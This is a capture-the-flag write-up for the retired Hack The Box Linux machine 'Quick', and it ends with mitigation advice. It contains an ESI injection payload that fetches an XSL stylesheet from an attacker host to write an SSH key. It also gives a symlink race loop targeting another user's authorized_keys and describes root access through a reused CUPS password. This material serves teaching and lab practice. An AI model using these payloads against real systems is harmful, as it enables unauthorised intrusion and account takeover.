---
machine: Quick
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, quic, http3, esi, race-condition, privesc]
---

# Quick — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Quick serves a site over QUIC/HTTP3 on 9001; curl must be built with HTTP3 to reach it. Credentials on the support site open the ticket system, vulnerable to ESI injection. An `esi:include` with `xsl:stylesheet` writes files as `sam` and adds an SSH key. On localhost, a second portal has a file race; it reads `srvadm`'s password and the same password is reused for `root`.

## Recon

```bash
nmap -Pn -sU -p9001 <IP>
nmap -Pn -sCV -p22,80,9001 <IP>
```

- `22` SSH, `80` HTTP and `9001` QUIC/HTTP3.
- The main site is served over HTTP/3 and does not answer a normal curl.
- Build curl with HTTP3 or use a compatible client.

```bash
curl --http3 -k https://quick.htb:9001/
```

## Enumeration

- The support site has credentials in text or a weak login.
- The ticket system accepts messages and processes ESI.
- `feroxbuster` finds `printerv2.quick.htb` only on localhost.

## Foothold

Log in to tickets with the found credentials and inject an ESI tag in the message. The server processes `esi:include` with a remote XSL stylesheet; the sheet writes files in `sam`'s home.

```text
<esi:include src="http://localhost/" stylesheet="http://<ATTACKER>/ssh.xsl"></esi:include>
```

The sheet creates `/home/sam/.ssh` and writes a public key to `authorized_keys`; then SSH in and tunnel to the printer portal.

## Lateral movement

The `printerv2.quick.htb` portal on localhost has a race: jobs are written to a shared directory and a file can be replaced with a symlink to `/home/srvadm/.ssh/id_rsa` or `authorized_keys`. Read the key or write your own and log in as `srvadm`.

```bash
while true; do for f in *; do ln -sf /home/srvadm/.ssh/authorized_keys "$f"; done; done
```

## Privilege escalation

The portal's CUPS configuration contains a `DeviceURI` with `srvadm`'s password. Decode the URL and the same password works for `root` with `su`.

```bash
grep -R 'DeviceURI' /etc/cups /var/www 2>/dev/null
su root
```

## Evidence

- QUIC/HTTP3 on 9001 and curl with HTTP3.
- Support-site credentials.
- ESI injection and write as `sam`.
- File race in printerv2 and `srvadm`.
- `DeviceURI` with `srvadm`'s password, reused by root.

## Lessons learned

- HTTP/3 can hide an application from HTTP/1.1 tooling.
- ESI with `xsl:stylesheet` can write files, not just read them.
- A symlink race in a shared directory reads or writes SSH keys.
- Printer credentials may sit in cleartext in configuration.

## Mitigation and detection

- Disable ESI or validate origins and XSL sheets.
- Do not share job directories with symlinks; use `O_NOFOLLOW`.
- Protect SSH keys and review internal portal permissions.
- Do not store credentials in `DeviceURI`; use a secret manager.

## References

- [0xdf — Quick](https://0xdf.gitlab.io/2020/08/29/htb-quick.html)
- [IppSec — Quick](https://www.youtube.com/watch?v=BFSdJYS1gFs)
- [Hack The Box — Quick](https://app.hackthebox.com/machines/quick)
